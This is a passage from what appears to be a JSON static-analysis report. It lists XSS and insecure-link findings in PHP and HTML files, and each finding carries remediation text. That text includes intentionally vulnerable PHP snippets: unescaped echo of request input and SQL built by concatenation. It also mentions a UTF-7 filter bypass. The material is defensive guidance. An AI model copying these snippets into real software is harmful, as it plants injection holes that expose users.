            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in example.php on line 82.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4641/?engineType=SCA&issue=B5A32B652D0F38273137DEF6BD2A70AD"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4703",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 82 of example.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in example.php on line 82.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4703/?engineType=SCA&issue=E1C10FF646D5E142CB1A105E79C50D34"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4753",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching.html on line 32 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4753/?engineType=SCA&issue=F967BDCE00A6EF97BC6B0868416F8CB3"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4754",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching.html on line 34 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4754/?engineType=SCA&issue=F967BDCE00A6EF97BC6B0868416F8CB4"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4755",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching.html on line 120 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4755/?engineType=SCA&issue=F967BDCE00A6EF97BC6B0868416F8CB5"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4406",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Database.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4406/?engineType=SCA&issue=1BEA368246DB744C9434AC35883C8764"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4407",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Database.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4407/?engineType=SCA&issue=1BEA368246DB744C9434AC35883C8765"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4408",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Database.html on line 241 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4408/?engineType=SCA&issue=1BEA368246DB744C9434AC35883C8766"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4543",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_File.html on line 37 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4543/?engineType=SCA&issue=7002F14B9BB38CBDE5B78F0D2EF657E6"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4544",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_File.html on line 39 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4544/?engineType=SCA&issue=7002F14B9BB38CBDE5B78F0D2EF657E7"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4545",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_File.html on line 239 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4545/?engineType=SCA&issue=7002F14B9BB38CBDE5B78F0D2EF657E8"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4373",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Interface.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4373/?engineType=SCA&issue=07690CB1D72EC58360BB6A34522D345A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4374",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file IDS_Caching_Interface.html on line 33 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
